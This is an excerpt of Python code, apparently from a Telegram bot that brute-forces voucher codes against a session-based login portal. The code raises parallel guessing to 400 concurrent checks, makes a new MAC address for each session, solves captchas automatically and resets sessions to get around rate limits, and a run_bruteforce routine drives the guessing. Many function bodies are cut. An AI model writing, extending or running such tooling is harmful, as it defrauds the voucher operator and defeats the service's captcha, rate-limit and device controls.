...
REPO_OWNER = "myatbhonemyatbhonec-boop"
REPO_NAME = "Myatbhone"
ADMIN_ID = "7289768738"
...
# ── SPEED OPTIMIZATION: Increase concurrency ─────────────────────────────
CONCURRENCY = 400  # was 200, increased for faster parallel checks
_voucher_sem = None
...
# ── SPEED OPTIMIZATION: Modified get_session_id to also return mac ──────
async def get_session_id(session_obj, session_url, previous_session_id=None):
    """Generate a new session_id and the mac used. Returns (session_id, mac)."""
    mac = get_mac()
...
# ── SPEED OPTIMIZATION: Modified perform_check to accept cached session_id and mac ──
async def perform_check(session_url, code, chat_id, scan_id=None, recheck=False, message=None, plan_filters=None,
    ...
    """
    Check a single voucher code.
    If cached_session_id and cached_mac are provided, they are reused (skips GET session_id).
    """
    global _connector
    if not recheck:
    ...
    for attempt in range(3):  # retry on rate limit
        ...
        async with aiohttp.ClientSession(
            ...
            # If we don't have a cached session_id, generate one fresh
            if session_id is None:
                sid, new_mac = await get_session_id(task_session, session_url)
                if sid:
                    session_id = sid
                    mac = new_mac
                else:
            ...
            # Solve captcha (max 4 attempts to save time)
            auth_code = None
            for _ in range(4):  # reduced from 8 to 4
                try:
                    ...
                    continue
            if not auth_code:
                # If captcha fails repeatedly, maybe session_id expired, force refresh
                session_id = None
                continue
            ...
            try:
                ...
                # if error, try with fresh session_id next loop
                session_id = None
                continue

        if response and 'request limited' in response:
            print(f"[perform_check] rate limited on code={code}, retrying (attempt {attempt+1}/3)")
            # If rate limited, maybe we should refresh session_id
            session_id = None
            continue
        break
...
# ── Brute-force runner (optimized with session reuse) ─────────────────────
success_messages = {}
limited_messages = {}
...
async def run_bruteforce(mode, chat_id, session_url, scan_id, target=None, message=None, progress_msg=None, plan_filters=None):
    ...
    SESSION_LIFETIME = 30  # seconds before we refresh session
